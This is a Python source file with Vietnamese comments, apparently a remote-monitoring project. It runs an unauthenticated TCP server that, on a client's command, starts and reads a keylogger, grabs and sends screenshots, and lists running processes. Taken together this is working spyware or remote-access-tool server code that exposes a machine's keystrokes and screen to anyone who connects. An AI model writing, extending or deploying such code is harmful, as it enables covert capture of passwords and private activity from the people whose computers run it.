import socket
import threading
from PIL import ImageGrab  # Để chụp màn hình
import io
from keylogger import Keylogger
import psutil


class Server:
    def __init__(self):
        self.server_ip = ""
        self.socket = None
        self.running = False
        self.keylogger = Keylogger()
        self.client_threads = []

    def stop_server(self):
        self.running = False
        if self.socket:
            self.socket.close()
        for client_thread in self.client_threads:
            client_thread.join()
        self.keylogger.stop()


    def start_server(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.bind((self.server_ip, 12345))
        self.socket.listen(1)
        print("Server đang chạy và lắng nghe kết nối.")
        self.running = True
        while self.running:
            try:
                client_socket, client_address = self.socket.accept()
                print(f"Đã kết nối từ {client_address[0]}:{client_address[1]}")

                # Tạo một luồng riêng để xử lý tin nhắn từ client
                client_thread = threading.Thread(target=self.handle_client, args=(client_socket,))
                client_thread.start()
                self.client_threads.append(client_thread)

            except OSError:
                if not self.running:
                    break
                else:
                    raise

    def handle_client(self, client_socket):
        try:
            while True:
                data = client_socket.recv(1024)
                if not data:
                    break
                data = data.decode()
                response = self.process_request(data, client_socket)
                if response is not None:
                    client_socket.sendall(response.encode())
        except Exception as e:
            print(f"Lỗi xử lý yêu cầu từ client: {str(e)}")
        finally:
            client_socket.close()

    def process_request(self, request, client_socket):
        if request == "start":
            self.keylogger.start()
            return ""
        elif request == "stop":
            self.keylogger.stop()
            return ""
        elif request == "clear":
            self.keylogger.clear_log()
            return ""
        elif request == "print":
            logs = self.keylogger.read_log()
            return logs
        elif request == "screenshot":
            # Thực hiện chụp màn hình và gửi hình ảnh về máy khách
            screenshot = self.capture_screenshot()
            client_socket.sendall(str(len(screenshot)).encode())  # Gửi kích thước trước
            client_socket.sendall(screenshot)  # Gửi dữ liệu hình ảnh
            return None  # Không cần trả về gì ở đây
        elif request == "get_processes":
            # Lấy danh sách các tiến trình hoạt động
            process_list = psutil.process_iter(attrs=['pid', 'name', 'cmdline', 'username', 'cpu_percent', 'memory_info'])
            # Biến để lưu thông tin về tiến trình
            process_info = []
            for process in process_list:
                process_info.append(f"PID: {process.info['pid']}, Name: {process.info['name']}")
            # Trả về thông tin về các tiến trình dưới dạng chuỗi
            return '\n'.join(process_info)
        else:
            return "Invalid request."



    def capture_screenshot(self):
        try:
            screenshot = ImageGrab.grab()
            image_byte_array = io.BytesIO()
            screenshot.save(image_byte_array, format="PNG")
            return image_byte_array.getvalue()
        except Exception as e:
            return f"Error capturing screenshot: {str(e)}"
# Tạo một đối tượng Server và khởi động server cùng với keylogger
if __name__ == "__main__":
    server = Server()
    server.start_server()